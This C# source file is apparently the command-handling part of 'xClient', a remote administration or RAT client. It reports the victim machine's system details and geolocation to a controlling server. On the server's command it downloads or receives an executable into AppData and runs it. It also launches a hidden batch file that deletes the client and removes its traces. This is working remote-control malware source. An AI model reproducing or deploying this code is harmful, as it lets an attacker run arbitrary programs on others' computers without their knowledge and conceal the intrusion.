using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using xClient.Config;
using xClient.Core.Helper;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE CONNECTION. */
    public static partial class CommandHandler
    {
        public static void HandleInitializeCommand(Packets.ServerPackets.InitializeCommand command, Client client)
        {
            SystemCore.InitializeGeoIp();
            new Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType,
                SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex,
                SystemCore.GetId()).Execute(client);
        }

        public static void HandleUpdate(Packets.ServerPackets.Update command, Client client)
        {
            // i dont like this updating... if anyone has a better idea feel free to edit it
            if (string.IsNullOrEmpty(command.DownloadURL))
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);

                try
                {
                    if (command.CurrentBlock == 0 && command.Block[0] != 'M' && command.Block[1] != 'Z')
                        throw new Exception("No executable file");

                    FileSplit destFile = new FileSplit(filePath);

                    if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                    {
                        new Packets.ClientPackets.Status(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
                            client);
                        return;
                    }

                    if ((command.CurrentBlock + 1) == command.MaxBlocks) // Upload finished
                    {
                        new Packets.ClientPackets.Status("Updating...").Execute(client);

                        SystemCore.UpdateClient(client, filePath);
                    }
                }
                catch (Exception ex)
                {
                    DeleteFile(filePath);
                    new Packets.ClientPackets.Status(string.Format("Update failed: {0}", ex.Message)).Execute(client);
                }

                return;
            }

            new Thread(() =>
            {
                new Packets.ClientPackets.Status("Downloading file...").Execute(client);

                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.Helper.GetRandomFilename(12, ".exe"));

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.DownloadURL, tempFile);
                    }
                }
                catch
                {
                    new Packets.ClientPackets.Status("Download failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.Status("Updating...").Execute(client);

                SystemCore.UpdateClient(client, tempFile);
            }).Start();
        }

        public static void HandleUninstall(Packets.ServerPackets.Uninstall command, Client client)
        {
            new Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);

            SystemCore.RemoveTraces();

            try
            {
                string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.Helper.GetRandomFilename(12, ".bat"));

                string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
                    ? "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    : "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    ;

                File.WriteAllText(filename, uninstallBatch);
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    FileName = filename
                };
                Process.Start(startInfo);
            }
            finally
            {
                SystemCore.Disconnect = true;
                client.Disconnect();
            }
        }
    }
}